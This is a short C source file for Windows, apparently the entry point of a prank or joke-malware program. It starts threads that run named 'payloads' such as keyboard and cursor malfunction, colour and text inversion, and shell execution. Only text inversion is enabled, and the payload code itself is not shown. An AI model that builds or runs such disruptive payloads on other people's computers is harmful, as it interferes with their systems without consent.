#include <payload.h>
#include <payload_function.h>

#include <Windows.h>
#include <stdio.h>


int main()
{
    payload_t payloads[] =
    {
        //{ shell_execute, 0, 0, 5000, 0, 0 },
        //{ keyboard_malfunction, 0, 0, 3000, 200, 200 },
        //{ cursor_malfunction, 5, 0, 100, 0, 0 },
        //{ invert_colors, 3, 0, 10000, 1000, 100 },
        { invert_text, 5, 2, 5000, 0, 0 }
    };

    const size_t payloads_size = sizeof(payloads) / sizeof(payload_t);

    for (size_t i = 0; i < payloads_size; ++i)
        CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)payload_host, &payloads[i], 0, 0);

    char a = getchar();
    return 0;
}